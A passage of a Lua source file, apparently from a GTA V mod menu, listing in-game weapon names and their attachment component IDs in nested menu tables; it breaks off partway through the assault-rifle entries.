	"WEAPON_PISTOL50",
	"WEAPON_SNSPISTOL",
	"WEAPON_HEAVYPISTOL",
	"WEAPON_VINTAGEPISTOL",
	"WEAPON_STUNGUN",
	"WEAPON_FLAREGUN",
	"WEAPON_MARKSMANPISTOL",
	"WEAPON_REVOLVER",
	"WEAPON_MICROSMG",
	"WEAPON_SMG",
	"WEAPON_SMG_MK2",
	"WEAPON_ASSAULTSMG",
	"WEAPON_MG",
	"WEAPON_COMBATMG",
	"WEAPON_COMBATMG_MK2",
	"WEAPON_COMBATPDW",
	"WEAPON_GUSENBERG",
	"WEAPON_MACHINEPISTOL",
	"WEAPON_ASSAULTRIFLE",
	"WEAPON_ASSAULTRIFLE_MK2",
	"WEAPON_CARBINERIFLE",
	"WEAPON_CARBINERIFLE_MK2",
	"WEAPON_ADVANCEDRIFLE",
	"WEAPON_SPECIALCARBINE",
	"WEAPON_BULLPUPRIFLE",
	"WEAPON_COMPACTRIFLE",
	"WEAPON_PUMPSHOTGUN",
	"WEAPON_SAWNOFFSHOTGUN",
	"WEAPON_BULLPUPSHOTGUN",
	"WEAPON_ASSAULTSHOTGUN",
	"WEAPON_MUSKET",
	"WEAPON_HEAVYSHOTGUN",
	"WEAPON_DBSHOTGUN",
	"WEAPON_SNIPERRIFLE",
	"WEAPON_HEAVYSNIPER",
	"WEAPON_HEAVYSNIPER_MK2",
	"WEAPON_MARKSMANRIFLE",
	"WEAPON_GRENADELAUNCHER",
	"WEAPON_GRENADELAUNCHER_SMOKE",
	"WEAPON_RPG",
	"WEAPON_STINGER",
	"WEAPON_FIREWORK",
	"WEAPON_HOMINGLAUNCHER",
	"WEAPON_GRENADE",
	"WEAPON_STICKYBOMB",
	"WEAPON_PROXMINE",
	"WEAPON_BZGAS",
	"WEAPON_SMOKEGRENADE",
	"WEAPON_MOLOTOV",
	"WEAPON_FIREEXTINGUISHER",
	"WEAPON_PETROLCAN",
	"WEAPON_SNOWBALL",
	"WEAPON_FLARE",
	"WEAPON_BALL"
}

local l_weapons = 
{
	Melee = {
		BaseballBat = { id = "weapon_bat", name="~h~~r~> ~s~Baseball Bat", bInfAmmo = false, mods = {} },
		BrokenBottle = { id = "weapon_bottle", name="~h~~r~> ~s~Broken Bottle", bInfAmmo = false, mods = {} },
		Crowbar = { id = "weapon_Crowbar", name="~h~~r~> ~s~Crowbar", bInfAmmo = false, mods = {} },
		Flashlight = { id = "weapon_flashlight", name="~h~~r~> ~s~Flashlight", bInfAmmo = false, mods = {} },
		GolfClub = { id = "weapon_golfclub", name="~h~~r~> ~s~Golf Club", bInfAmmo = false, mods = {} },
		BrassKnuckles = { id = "weapon_knuckle", name="~h~~r~> ~s~Brass Knuckles", bInfAmmo = false, mods = {} },
		Knife = { id = "weapon_knife", name="~h~~r~> ~s~Knife", bInfAmmo = false, mods = {} },
		Machete = { id = "weapon_machete", name="~h~~r~> ~s~Machete", bInfAmmo = false, mods = {} },
		Switchblade = { id = "weapon_switchblade", name="~h~~r~> ~s~Switchblade", bInfAmmo = false, mods = {} },
		Nightstick = { id = "weapon_nightstick", name="~h~~r~> ~s~Nightstick", bInfAmmo = false, mods = {} },
		BattleAxe = { id = "weapon_battleaxe", name="~h~~r~> ~s~Battle Axe", bInfAmmo = false, mods = {}},
		},
	Handguns = {	
		Pistol = { id = "weapon_pistol", name="~h~~r~> ~s~Pistol", bInfAmmo = false, mods = { 
		Magazines = {
			{name = "~h~~r~> ~s~Default Magazine", id="COMPONENT_PISTOL_CLIP_01"},
			{name = "~h~~r~> ~s~Extended Magazine", id="COMPONENT_PISTOL_CLIP_02"}
		},
		Flashlight = 
		{
			{name = "~h~~r~> ~s~Flashlight", id="COMPONENT_AT_PI_FLSH"}
		}, 
		BarrelAttachments = 
		{
			{name = "~h~~r~> ~s~Suppressor", id="COMPONENT_AT_PI_SUPP_02"}
		}
		}},
		PistolMK2 = { id = "weapon_pistol_mk2", name="~h~~r~> ~s~Pistol MK 2", bInfAmmo = false, mods = 
		{
			Magazines =
				{
					{name = "~h~~r~> ~s~Default Magazine", id="COMPONENT_PISTOL_MK2_CLIP_01"},
					{name = "~h~~r~> ~s~Extended Magazine", id="COMPONENT_PISTOL_MK2_CLIP_02"},
					{name = "~h~~r~> ~s~Tracer Rounds", id="COMPONENT_PISTOL_MK2_CLIP_TRACER"},
					{name = "~h~~r~> ~s~Incendiary Rounds", id="COMPONENT_PISTOL_MK2_CLIP_INCENDIARY"},
					{name = "~h~~r~> ~s~Hollow Point Rounds", id="COMPONENT_PISTOL_MK2_CLIP_HOLLOWPOINT"},
					{name = "~h~~r~> ~s~FMJ Rounds", id="COMPONENT_PISTOL_MK2_CLIP_FMJ"},		
				},
				Sights =
				{
					{name = "~h~~r~> ~s~Mounted Scope", id="COMPONENT_AT_PI_RAIL"},
				},
				Flashlight = 
				{
					{name = "~h~~r~> ~s~Flashlight", id="COMPONENT_AT_PI_FLSH_02"},			
				},
				BarrelAttachments =
				{
					{name = "~h~~r~> ~s~Compensator", id="COMPONENT_AT_PI_COMP"},
					{name = "~h~~r~> ~s~Suppessor", id="COMPONENT_AT_PI_SUPP_02"},
				}
			} },
		CombatPistol = { id = "weapon_combatpistol", name = "~h~Combat Pistol", bInfAmmo = false, mods = {
			Magazines = 
			{
				{name = "~h~~r~> ~s~Default Magazine", id="COMPONENT_COMBATPISTOL_CLIP_01"},
				{name = "~h~~r~> ~s~Extended Magazine", id="COMPONENT_COMBATPISTOL_CLIP_02"}
			},
			Flashlight = 
			{
				{name = "~h~~r~> ~s~Flashlight", id="COMPONENT_AT_PI_FLSH"}
			},
			BarrelAttachments = 
			{
				{name = "~h~~r~> ~s~Suppressor", id="COMPONENT_AT_PI_SUPP"}
			} 
		} },
		APPistol = { id = "weapon_appistol",name ="AP Pistol", bInfAmmo = false, mods = {
			Magazines = 
			{
				{name = "~h~~r~> ~s~Default Magazine", id="COMPONENT_APPISTOL_CLIP_01"}, 
				{name = "~h~~r~> ~s~Extended Magazine", id="COMPONENT_APPISTOL_CLIP_02"}
			},
			Flashlight = 
			{
				{name = "~h~~r~> ~s~Flashlight", id="COMPONENT_AT_PI_FLSH"}
			},
			BarrelAttachments = 
			{
				{name = "~h~~r~> ~s~Suppressor", id="COMPONENT_AT_PI_SUPP"}
			} 
			}},
		StunGun = { id = "weapon_stungun", name="~h~~r~> ~s~Stun Gun", bInfAmmo = false, mods = {} },
		Pistol50 = { id = "weapon_pistol50", name="~h~~r~> ~s~Pistol .50", bInfAmmo = false, mods = {
			Magazines = 
			{
				{name = "~h~~r~> ~s~Default Magazine", id="COMPONENT_PISTOL50_CLIP_01"},
				{name = "~h~~r~> ~s~Extended Magazine", id="COMPONENT_PISTOL50_CLIP_02"}
			},
			Flashlight = 
			{
				{name = "~h~~r~> ~s~Flashlight", id="COMPONENT_AT_PI_FLSH"}
			},
			BarrelAttachments = 
			{
				{name = "~h~~r~> ~s~Suppressor", id="COMPONENT_AT_PI_SUPP_02"}
			} 
		}},
		SNSPistol = { id = "weapon_snspistol",name="~h~~r~> ~s~SNS Pistol", bInfAmmo = false, mods = {
			Magazines = 
			{
				{name = "~h~~r~> ~s~Default Magazine", id="COMPONENT_SNSPISTOL_CLIP_01"},
				{name = "~h~~r~> ~s~Extended Magazine", id="COMPONENT_SNSPISTOL_CLIP_02"}
			}
		}},
		SNSPistolMkII = { id = "weapon_snspistol_mk2",name="~h~~r~> ~s~SNS Pistol Mk II", bInfAmmo = false, mods = {
		Magazines =
			{
				{name = "~h~~r~> ~s~Default Magazine", id="COMPONENT_SNSPISTOL_MK2_CLIP_01"},
				{name = "~h~~r~> ~s~Extended Magazine", id="COMPONENT_SNSPISTOL_MK2_CLIP_02"},
				{name = "~h~~r~> ~s~Tracer Rounds", id="COMPONENT_SNSPISTOL_MK2_CLIP_TRACER"},
				{name = "~h~~r~> ~s~Incendiary Rounds", id="COMPONENT_SNSPISTOL_MK2_CLIP_INCENDIARY"},
				{name = "~h~~r~> ~s~Hollow Point Rounds", id="COMPONENT_SNSPISTOL_MK2_CLIP_HOLLOWPOINT"},
				{name = "~h~~r~> ~s~FMJ Rounds", id="COMPONENT_SNSPISTOL_MK2_CLIP_FMJ"},		
			},
			Sights =
			{
				{name = "~h~~r~> ~s~Mounted Scope", id="COMPONENT_AT_PI_RAIL_02"},
			},
			Flashlight = 
			{
				{name = "~h~~r~> ~s~Flashlight", id="COMPONENT_AT_PI_FLSH_03"},			
			},
			BarrelAttachments =
			{
				{name = "~h~~r~> ~s~Compensator", id="COMPONENT_AT_PI_COMP_02"},
				{name = "~h~~r~> ~s~Suppressor", id="COMPONENT_AT_PI_SUPP_02"},
			}
		
		} },
		HeavyPistol = { id = "weapon_heavypistol",name="~h~~r~> ~s~Heavy Pistol", bInfAmmo = false, mods = {
			Magazines = 
			{
				{name = "~h~~r~> ~s~Default Magazine", id="COMPONENT_HEAVYPISTOL_CLIP_01"},
				{name = "~h~~r~> ~s~Extended Magazine", id="COMPONENT_HEAVYPISTOL_CLIP_02"}
			}, 
			Flashlight = 
			{
				{name = "~h~~r~> ~s~Flashlight", id="COMPONENT_AT_PI_FLSH"}
			},
			BarrelAttachments =
			{
				{name = "~h~~r~> ~s~Suppressor", id="COMPONENT_AT_PI_SUPP"}
			} 
		}},
		VintagePistol = { id = "weapon_vintagepistol",name="~h~~r~> ~s~Vintage Pistol", bInfAmmo = false, mods = {
		Magazines = 
		{
			{name = "~h~~r~> ~s~Default Magazine", id="COMPONENT_VINTAGEPISTOL_CLIP_01"},
			{name = "~h~~r~> ~s~Extended Magazine", id="COMPONENT_VINTAGEPISTOL_CLIP_02"}
		},
		BarrelAttachments = 
			{
				{"Suppressor", id="COMPONENT_AT_PI_SUPP"}
			}
		} },
		FlareGun = { id = "weapon_flaregun", name="~h~~r~> ~s~Flare Gun", bInfAmmo = false, mods = {} },
		MarksmanPistol = { id = "weapon_marksmanpistol", name="~h~~r~> ~s~Marksman Pistol", bInfAmmo = false, mods = {} },
		HeavyRevolver = { id = "weapon_revolver", name="~h~~r~> ~s~Heavy Revolver", bInfAmmo = false, mods = {} },
		HeavyRevolverMkII = { id = "weapon_revolver_mk2", name="~h~~r~> ~s~Heavy Revolver Mk II", bInfAmmo = false, mods = {
		Magazines =
			{
				{name = "~h~~r~> ~s~Default Rounds", id="COMPONENT_REVOLVER_MK2_CLIP_01"},
				{name = "~h~~r~> ~s~Tracer Rounds", id="COMPONENT_REVOLVER_MK2_CLIP_TRACER"},
				{name = "~h~~r~> ~s~Incendiary Rounds", id="COMPONENT_REVOLVER_MK2_CLIP_INCENDIARY"},
				{name = "~h~~r~> ~s~Hollow Point Rounds", id="COMPONENT_REVOLVER_MK2_CLIP_HOLLOWPOINT"},
				{name = "~h~~r~> ~s~FMJ Rounds", id="COMPONENT_REVOLVER_MK2_CLIP_FMJ"},		
			},
			Sights =
			{
				{name = "~h~~r~> ~s~Holograhpic Sight", id="COMPONENT_AT_SIGHTS"},
				{name = "~h~~r~> ~s~Small Scope", id="COMPONENT_AT_SCOPE_MACRO_MK2"},
			},
			Flashlight = 
			{
				{name = "~h~~r~> ~s~Flashlight", id="COMPONENT_AT_PI_FLSH"},			
			},
			BarrelAttachments =
			{
				{name = "~h~~r~> ~s~Compensator", id="COMPONENT_AT_PI_COMP_03"},
			}
			} },
		DoubleActionRevolver = { id = "weapon_doubleaction", name="~h~~r~> ~s~Double Action Revolver", bInfAmmo = false, mods = {} },
		UpnAtomizer = { id = "weapon_raypistol", name="~h~~r~> ~s~Up-n-Atomizer", bInfAmmo = false, mods = {} },	
	},
	SMG = {	
		MicroSMG = { id = "weapon_microsmg", name="~h~~r~> ~s~Micro SMG", bInfAmmo = false, mods = {
			Magazines = 
			{
				{name = "~h~~r~> ~s~Default Magazine", id="COMPONENT_MICROSMG_CLIP_01"},
				{name = "~h~~r~> ~s~Extended Magazine", id="COMPONENT_MICROSMG_CLIP_02"}
			},
			Sights =
			{
				{name = "~h~~r~> ~s~Scope", id="COMPONENT_AT_SCOPE_MACRO"}
			},
			Flashlight = 
			{			
				{name = "~h~~r~> ~s~Flashlight", id="COMPONENT_AT_PI_FLSH"}
			},
			BarrelAttachments = 
			{
				{name = "~h~~r~> ~s~Suppressor", id="COMPONENT_AT_AR_SUPP_02"}
			}
		} },
		SMG = { id = "weapon_smg", name="~h~~r~> ~s~SMG", bInfAmmo = false, mods = {
			Magazines = 
			{
				{name = "~h~~r~> ~s~Default Magazine", id="COMPONENT_SMG_CLIP_01"},
				{name = "~h~~r~> ~s~Extended Magazine", id="COMPONENT_SMG_CLIP_02"},
				{name = "~h~~r~> ~s~Drum Magazine", id="COMPONENT_SMG_CLIP_03"},
			},
			Sights =
			{			
				{name = "~h~~r~> ~s~Scope", id="COMPONENT_AT_SCOPE_MACRO_02"},
			},
			Flashlight = 
			{
				{name = "~h~~r~> ~s~Flashlight", id="COMPONENT_AT_AR_FLSH"},				
			},
			BarrelAttachments = 
			{
				{name = "~h~~r~> ~s~Suppressor", id="COMPONENT_AT_PI_SUPP"}
			}				
		} },
		SMGMkII = { id = "weapon_smg_mk2", name="~h~~r~> ~s~SMG Mk II", bInfAmmo = false, mods = {
			Magazines =
			{
				{name = "~h~~r~> ~s~Default Magazine", id="COMPONENT_SMG_MK2_CLIP_01"},
				{name = "~h~~r~> ~s~Extended Magazine", id="COMPONENT_SMG_MK2_CLIP_02"},
				{name = "~h~~r~> ~s~Tracer Rounds", id="COMPONENT_SMG_MK2_CLIP_TRACER"},
				{name = "~h~~r~> ~s~Incendiary Rounds", id="COMPONENT_SMG_MK2_CLIP_INCENDIARY"},
				{name = "~h~~r~> ~s~Hollow Point Rounds", id="COMPONENT_SMG_MK2_CLIP_HOLLOWPOINT"},
				{name = "~h~~r~> ~s~FMJ Rounds", id="COMPONENT_SMG_MK2_CLIP_FMJ"},		
			},
			Sights =
			{
				{name = "~h~~r~> ~s~Holograhpic Sight", id="COMPONENT_AT_SIGHTS_SMG"},
				{name = "~h~~r~> ~s~Small Scope", id="COMPONENT_AT_SCOPE_MACRO_02_SMG_MK2"},
				{name = "~h~~r~> ~s~Medium Scope", id="COMPONENT_AT_SCOPE_SMALL_SMG_MK2"},
			},
			Flashlight = 
			{
				{name = "~h~~r~> ~s~Flashlight", id="COMPONENT_AT_AR_FLSH"},			
			},			
			Barrel = 
			{
				{name = "~h~~r~> ~s~Default", id="COMPONENT_AT_SB_BARREL_01"},	
				{name = "~h~~r~> ~s~Heavy", id="COMPONENT_AT_SB_BARREL_02"},			
			},
			BarrelAttachments =
			{
				{name = "~h~~r~> ~s~Suppressor", id="COMPONENT_AT_PI_SUPP"},
				{name = "~h~~r~> ~s~Flat Muzzle Brake", id="COMPONENT_AT_MUZZLE_01"},
				{name = "~h~~r~> ~s~Tactical Muzzle Brake", id="COMPONENT_AT_MUZZLE_02"},
				{name = "~h~~r~> ~s~Fat-End Muzzle Brake", id="COMPONENT_AT_MUZZLE_03"},
				{name = "~h~~r~> ~s~Precision Muzzle Brake", id="COMPONENT_AT_MUZZLE_04"},
				{name = "~h~~r~> ~s~Heavy Duty Muzzle Brake", id="COMPONENT_AT_MUZZLE_05"},
				{name = "~h~~r~> ~s~Slanted Muzzle Brake", id="COMPONENT_AT_MUZZLE_06"},
				{name = "~h~~r~> ~s~Split-End Muzzle Brake", id="COMPONENT_AT_MUZZLE_07"},
			}
		
		} },
		AssaultSMG = { id = "weapon_assaultsmg", name="~h~~r~> ~s~Assault SMG", bInfAmmo = false, mods = {
			Magazines = 
			{
				{name = "~h~~r~> ~s~Default Magazine", id="COMPONENT_ASSAULTSMG_CLIP_01"},
				{name = "~h~~r~> ~s~Extended Magazine", id="COMPONENT_ASSAULTSMG_CLIP_02"}
			},
			Sights =
			{
				{name = "~h~~r~> ~s~Scope", id="COMPONENT_AT_SCOPE_MACRO"},			
			},
			Flashlight = 
			{
				{name = "~h~~r~> ~s~Flashlight", id="COMPONENT_AT_AR_FLSH"},				
			},
			BarrelAttachments = 
			{
				{name = "~h~~r~> ~s~Suppressor", id="COMPONENT_AT_AR_SUPP_02"}
			}
		} },
		CombatPDW = { id = "weapon_combatpdw", name="~h~~r~> ~s~Combat PDW", bInfAmmo = false, mods = {
			Magazines = 
			{
				{name = "~h~~r~> ~s~Default Magazine", id="COMPONENT_COMBATPDW_CLIP_01"},
				{name = "~h~~r~> ~s~Extended Magazine", id="COMPONENT_COMBATPDW_CLIP_02"},
				{name = "~h~~r~> ~s~Drum Magazine", id="COMPONENT_COMBATPDW_CLIP_03"},
			},
			Sights =
			{
				{name = "~h~~r~> ~s~Scope", id="COMPONENT_AT_SCOPE_SMALL"},			
			},
			Flashlight = 
			{
				{name = "~h~~r~> ~s~Flashlight", id="COMPONENT_AT_AR_FLSH"},				
			},
			Grips =
			{
				{name = "~h~~r~> ~s~Grip", id="COMPONENT_AT_AR_AFGRIP"}			
			},
		} },
		MachinePistol = { id = "weapon_machinepistol", name="~h~~r~> ~s~Machine Pistol ", bInfAmmo = false, mods = {
			Magazines = 
			{
				{name = "~h~~r~> ~s~Default Magazine", id="COMPONENT_MACHINEPISTOL_CLIP_01"},
				{name = "~h~~r~> ~s~Extended Magazine", id="COMPONENT_MACHINEPISTOL_CLIP_02"},
				{name = "~h~~r~> ~s~Drum Magazine", id="COMPONENT_MACHINEPISTOL_CLIP_03"},
			},
			BarrelAttachments = 
			{
				{name = "~h~~r~> ~s~Suppressor", id="COMPONENT_AT_PI_SUPP"}
			}
		} },
		MiniSMG = { id = "weapon_minismg", name="~h~~r~> ~s~Mini SMG", bInfAmmo = false, mods = {
			Magazines = 
			{
				{name = "~h~~r~> ~s~Default Magazine", id="COMPONENT_MINISMG_CLIP_01"},
				{name = "~h~~r~> ~s~Extended Magazine", id="COMPONENT_MINISMG_CLIP_02"}
			},
		} },
		UnholyHellbringer = { id = "weapon_raycarbine", name="~h~~r~> ~s~Unholy Hellbringer", bInfAmmo = false, mods = {} },	
	},
	Shotguns = {	
		PumpShotgun = { id = "weapon_pumpshotgun", name="~h~~r~> ~s~Pump Shotgun", bInfAmmo = false, mods = {
			Flashlight = 
			{
				{"name = Flashlight", id="COMPONENT_AT_AR_FLSH"},				
			},
			BarrelAttachments = 
			{
				{name = "~h~~r~> ~s~Suppressor", id="COMPONENT_AT_SR_SUPP"},
			},		
		} },
		PumpShotgunMkII = { id = "weapon_pumpshotgun_mk2", name="~h~~r~> ~s~Pump Shotgun Mk II", bInfAmmo = false, mods = {
			Magazines =
			{
				{name = "~h~~r~> ~s~Default Shells", id="COMPONENT_PUMPSHOTGUN_MK2_CLIP_01"},
				{name = "~h~~r~> ~s~Dragon Breath Shells", id="COMPONENT_PUMPSHOTGUN_MK2_CLIP_INCENDIARY"},
				{name = "~h~~r~> ~s~Steel Buckshot Shells", id="COMPONENT_PUMPSHOTGUN_MK2_CLIP_ARMORPIERCING"},
				{name = "~h~~r~> ~s~Flechette Shells", id="COMPONENT_PUMPSHOTGUN_MK2_CLIP_HOLLOWPOINT"},
				{name = "~h~~r~> ~s~Explosive Slugs", id="COMPONENT_PUMPSHOTGUN_MK2_CLIP_EXPLOSIVE"},
			},
			Sights =
			{
				{name = "~h~~r~> ~s~Holograhpic Sight", id="COMPONENT_AT_SIGHTS"},
				{name = "~h~~r~> ~s~Small Scope", id="COMPONENT_AT_SCOPE_MACRO_MK2"},
				{name = "~h~~r~> ~s~Medium Scope", id="COMPONENT_AT_SCOPE_SMALL_MK2"},
			},
			Flashlight = 
			{
				{name = "~h~~r~> ~s~Flashlight", id="COMPONENT_AT_AR_FLSH"},			
			},			
			BarrelAttachments =
			{
				{name = "~h~~r~> ~s~Suppressor", id="COMPONENT_AT_SR_SUPP_03"},
				{name = "~h~~r~> ~s~Squared Muzzle Brake", id="COMPONENT_AT_MUZZLE_08"},
			}
		} },
		SawedOffShotgun = { id = "weapon_sawnoffshotgun", name="~h~~r~> ~s~Sawed-Off Shotgun", bInfAmmo = false, mods = {} },
		AssaultShotgun = { id = "weapon_assaultshotgun", name="~h~~r~> ~s~Assault Shotgun", bInfAmmo = false, mods = {
			Magazines = 
			{
				{name = "~h~~r~> ~s~Default Magazine", id="COMPONENT_ASSAULTSHOTGUN_CLIP_01"},
				{name = "~h~~r~> ~s~Extended Magazine", id="COMPONENT_ASSAULTSHOTGUN_CLIP_02"},
			},
			Flashlight = 
			{
				{name = "~h~~r~> ~s~Flashlight", id="COMPONENT_AT_AR_FLSH"},				
			},
			BarrelAttachments = 
			{
				{name = "~h~~r~> ~s~Suppressor", id="COMPONENT_AT_AR_SUPP"},
			},
			Grips =
			{
				{name = "~h~~r~> ~s~Grip", id="COMPONENT_AT_AR_AFGRIP"}			
			},
		
		} },
		BullpupShotgun = { id = "weapon_bullpupshotgun", name="~h~~r~> ~s~Bullpup Shotgun", bInfAmmo = false, mods = {
			Flashlight = 
			{
				{name = "~h~~r~> ~s~Flashlight", id="COMPONENT_AT_AR_FLSH"},				
			},
			BarrelAttachments = 
			{
				{name = "~h~~r~> ~s~Suppressor", id="COMPONENT_AT_AR_SUPP_02"},
			},
			Grips =
			{
				{name = "~h~~r~> ~s~Grip", id="COMPONENT_AT_AR_AFGRIP"}			
			},
		} },
		Musket = { id = "weapon_musket", name="~h~~r~> ~s~Musket", bInfAmmo = false, mods = {} },
		HeavyShotgun = { id = "weapon_heavyshotgun", name="~h~~r~> ~s~Heavy Shotgun", bInfAmmo = false, mods = {
			Magazines = 
			{
				{name = "~h~~r~> ~s~Default Magazine", id="COMPONENT_HEAVYSHOTGUN_CLIP_01"},
				{name = "~h~~r~> ~s~Extended Magazine", id="COMPONENT_HEAVYSHOTGUN_CLIP_02"},
				{name = "~h~~r~> ~s~Drum Magazine", id="COMPONENT_HEAVYSHOTGUN_CLIP_02"},
			},
			Flashlight = 
			{
				{name = "~h~~r~> ~s~Flashlight", id="COMPONENT_AT_AR_FLSH"},				
			},
			BarrelAttachments = 
			{
				{name = "~h~~r~> ~s~Suppressor", id="COMPONENT_AT_AR_SUPP_02"},
			},
			Grips =
			{
				{name = "~h~~r~> ~s~Grip", id="COMPONENT_AT_AR_AFGRIP"}			
			},
		} },
		DoubleBarrelShotgun = { id = "weapon_dbshotgun", name="~h~~r~> ~s~Double Barrel Shotgun", bInfAmmo = false, mods = {} },
		SweeperShotgun = { id = "weapon_autoshotgun", name="~h~~r~> ~s~Sweeper Shotgun", bInfAmmo = false, mods = {} },
	},
	AssaultRifles = {	
		AssaultRifle = { id = "weapon_assaultrifle", name="~h~~r~> ~s~Assault Rifle", bInfAmmo = false, mods = {
			Magazines = 
			{
				{name = "~h~~r~> ~s~Default Magazine", id="COMPONENT_ASSAULTRIFLE_CLIP_01"},
				{name = "~h~~r~> ~s~Extended Magazine", id="COMPONENT_ASSAULTRIFLE_CLIP_02"},
				{name = "~h~~r~> ~s~Drum Magazine", id="COMPONENT_ASSAULTRIFLE_CLIP_03"},
			},
			Sights =
			{
				{name = "~h~~r~> ~s~Scope", id="COMPONENT_AT_SCOPE_MACRO"},			
			},
			Flashlight = 
			{
				{name = "~h~~r~> ~s~Flashlight", id="COMPONENT_AT_AR_FLSH"},				
			},
			BarrelAttachments = 
			{
				{name = "~h~~r~> ~s~Suppressor", id="COMPONENT_AT_AR_SUPP_02"},
			},
			Grips =
			{
				{name = "~h~~r~> ~s~Grip", id="COMPONENT_AT_AR_AFGRIP"}			
			},
		
		} },
		AssaultRifleMkII = { id = "weapon_assaultrifle_mk2", name="~h~~r~> ~s~Assault Rifle Mk II", bInfAmmo = false, mods = {
			Magazines =
			{
				{name = "~h~~r~> ~s~Default Magazine", id="COMPONENT_ASSAULTRIFLE_MK2_CLIP_01"},
				{name = "~h~~r~> ~s~Extended Magazine", id="COMPONENT_ASSAULTRIFLE_MK2_CLIP_02"},
				{name = "~h~~r~> ~s~Tracer Rounds", id="COMPONENT_ASSAULTRIFLE_MK2_CLIP_TRACER"},
				{name = "~h~~r~> ~s~Incendiary Rounds", id="COMPONENT_ASSAULTRIFLE_MK2_CLIP_INCENDIARY"},
				{name = "~h~~r~> ~s~Hollow Point Rounds", id="COMPONENT_ASSAULTRIFLE_MK2_CLIP_ARMORPIERCING"},
				{name = "~h~~r~> ~s~FMJ Rounds", id="COMPONENT_ASSAULTRIFLE_MK2_CLIP_FMJ"},		
			},
			Sights =
			{
				{name = "~h~~r~> ~s~Holograhpic Sight", id="COMPONENT_AT_SIGHTS"},
				{name = "~h~~r~> ~s~Small Scope", id="COMPONENT_AT_SCOPE_MACRO_MK2"},
				{name = "~h~~r~> ~s~Large Scope", id="COMPONENT_AT_SCOPE_MEDIUM_MK2"},
			},
			Flashlight = 
			{
				{name = "~h~~r~> ~s~Flashlight", id="COMPONENT_AT_AR_FLSH"},			
			},			
			Barrel = 
			{
				{name = "~h~~r~> ~s~Default", id="COMPONENT_AT_AR_BARREL_01"},	
				{name = "~h~~r~> ~s~Heavy", id="COMPONENT_AT_AR_BARREL_0"},			
			},
			BarrelAttachments =
			{
				{name = "~h~~r~> ~s~Suppressor", id="COMPONENT_AT_AR_SUPP_02"},
				{name = "~h~~r~> ~s~Flat Muzzle Brake", id="COMPONENT_AT_MUZZLE_01"},
				{name = "~h~~r~> ~s~Tactical Muzzle Brake", id="COMPONENT_AT_MUZZLE_02"},
				{name = "~h~~r~> ~s~Fat-End Muzzle Brake", id="COMPONENT_AT_MUZZLE_03"},
				{name = "~h~~r~> ~s~Precision Muzzle Brake", id="COMPONENT_AT_MUZZLE_04"},
				{name = "~h~~r~> ~s~Heavy Duty Muzzle Brake", id="COMPONENT_AT_MUZZLE_05"},
				{name = "~h~~r~> ~s~Slanted Muzzle Brake", id="COMPONENT_AT_MUZZLE_06"},
				{name = "~h~~r~> ~s~Split-End Muzzle Brake", id="COMPONENT_AT_MUZZLE_07"},
			},
			Grips =
			{
				{ name = "~h~~r~> ~s~Grip", id="COMPONENT_AT_AR_AFGRIP_02"}			
			},
			
		} },
		CarbineRifle = { id = "weapon_carbinerifle", name="~h~~r~> ~s~Carbine Rifle", bInfAmmo = false, mods = {
			Magazines = 
			{
				{ name = "~h~~r~> ~s~Default Magazine", id="COMPONENT_CARBINERIFLE_CLIP_01"},
				{ name = "~h~~r~> ~s~Extended Magazine", id="COMPONENT_CARBINERIFLE_CLIP_02"},
				{ name = "~h~~r~> ~s~Box Magazine", id="COMPONENT_CARBINERIFLE_CLIP_03"},
			},
			Sights =
			{
				{ name = "~h~~r~> ~s~Scope", id="COMPONENT_AT_SCOPE_MEDIUM"},			
			},
			Flashlight = 
			{
				{ name = "~h~~r~> ~s~Flashlight", id="COMPONENT_AT_AR_FLSH"},				
			},
			BarrelAttachments = 
			{
				{ name = "~h~~r~> ~s~Suppressor", id="COMPONENT_AT_AR_SUPP"},
			},
			Grips =
			{
				{ name = "~h~~r~> ~s~Grip", id="COMPONENT_AT_AR_AFGRIP"}			
			},
		
		} },
		CarbineRifleMkII = { id = "weapon_carbinerifle_mk2", name="~h~~r~> ~s~Carbine Rifle Mk II ", bInfAmmo = false, mods = {
			Magazines =
			{
				{ name = "~h~~r~> ~s~Default Magazine", id="COMPONENT_CARBINERIFLE_MK2_CLIP_01"},
				{ name = "~h~~r~> ~s~Extended Magazine", id="COMPONENT_CARBINERIFLE_MK2_CLIP_02"},
				{ name = "~h~~r~> ~s~Tracer Rounds", id="COMPONENT_CARBINERIFLE_MK2_CLIP_TRACER"},
				{ name = "~h~~r~> ~s~Incendiary Rounds", id="COMPONENT_CARBINERIFLE_MK2_CLIP_INCENDIARY"},
				{ name = "~h~~r~> ~s~Hollow Point Rounds", id="COMPONENT_CARBINERIFLE_MK2_CLIP_ARMORPIERCING"},
				{ name = "~h~~r~> ~s~FMJ Rounds", id="COMPONENT_CARBINERIFLE_MK2_CLIP_FMJ"},		
			},
			Sights =
			{
				{ name = "~h~~r~> ~s~Holograhpic Sight", id="COMPONENT_AT_SIGHTS"},
				{ name = "~h~~r~> ~s~Small Scope", id="COMPONENT_AT_SCOPE_MACRO_MK2"},
				{ name = "~h~~r~> ~s~Large Scope", id="COMPONENT_AT_SCOPE_MEDIUM_MK2"},
			},
			Flashlight = 
			{
				{ name = "~h~~r~> ~s~Flashlight", id="COMPONENT_AT_AR_FLSH"},			
			},			
			Barrel = 
			{
				{ name = "~h~~r~> ~s~Default", id="COMPONENT_AT_CR_BARREL_01"},	
				{ name = "~h~~r~> ~s~Heavy", id="COMPONENT_AT_CR_BARREL_02"},			
			},
			BarrelAttachments =
			{
				{ name = "~h~~r~> ~s~Suppressor", id="COMPONENT_AT_AR_SUPP"},
				{ name = "~h~~r~> ~s~Flat Muzzle Brake", id="COMPONENT_AT_MUZZLE_01"},
				{ name = "~h~~r~> ~s~Tactical Muzzle Brake", id="COMPONENT_AT_MUZZLE_02"},
				{ name = "~h~~r~> ~s~Fat-End Muzzle Brake", id="COMPONENT_AT_MUZZLE_03"},
				{ name = "~h~~r~> ~s~Precision Muzzle Brake", id="COMPONENT_AT_MUZZLE_04"},
				{ name = "~h~~r~> ~s~Heavy Duty Muzzle Brake", id="COMPONENT_AT_MUZZLE_05"},
				{ name = "~h~~r~> ~s~Slanted Muzzle Brake", id="COMPONENT_AT_MUZZLE_06"},
				{ name = "~h~~r~> ~s~Split-End Muzzle Brake", id="COMPONENT_AT_MUZZLE_07"},
			},
			Grips =
			{
				{ name = "~h~~r~> ~s~Grip", id="COMPONENT_AT_AR_AFGRIP_02"}			
			},
			
		
		} },
		AdvancedRifle = { id = "weapon_advancedrifle", name="~h~~r~> ~s~Advanced Rifle ", bInfAmmo = false, mods = {
			Magazines = 
			{
				{ name = "~h~~r~> ~s~Default Magazine", id="COMPONENT_ADVANCEDRIFLE_CLIP_01"},
